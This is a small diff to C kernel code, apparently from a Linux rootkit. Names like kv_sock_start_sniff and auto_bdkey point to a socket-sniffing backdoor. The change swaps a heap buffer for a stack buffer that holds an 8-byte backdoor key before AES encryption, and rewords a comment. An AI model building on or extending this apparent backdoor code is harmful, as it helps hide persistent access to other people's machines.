@@ -596,14 +596,11 @@ struct task_struct *kv_sock_start_sniff(void) {
      */
     kvmgc_bdkey = crypto_init();
     if (kvmgc_bdkey) {
-        /** Allocate more than needed (8)
-         * as its the minimum for AES-256
-         * */
+        /** for the aes-256, 16 bytes
+         * is minimum data size
+         */
         size_t datalen = 16;
-        u8 *buf = kmalloc(datalen, GFP_KERNEL);
-        if (!buf)
-            return NULL;
-
+        u8 buf[16] = {0};
         memcpy(buf, &auto_bdkey, 8);
         kv_encrypt(kvmgc_bdkey, buf, datalen);
 
